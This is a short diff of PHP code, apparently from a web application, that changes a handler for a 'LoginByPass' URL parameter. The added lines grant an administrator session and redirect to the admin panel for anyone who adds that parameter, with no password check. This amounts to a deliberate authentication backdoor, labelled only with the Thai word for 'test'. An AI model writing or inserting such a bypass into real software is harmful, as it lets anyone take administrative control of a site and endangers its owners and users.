@@ -34,7 +34,8 @@
     <?php
     if (isset($_GET['LoginByPass'])) {
       echo 'ทดสอบ';
-      $_SESSION['admin_login'] = "";
+      $_SESSION['admin_login'] = 1;
+      $_SESSION['user_type'] = 0;
       header("location: admin_panel");
     }
     ?>
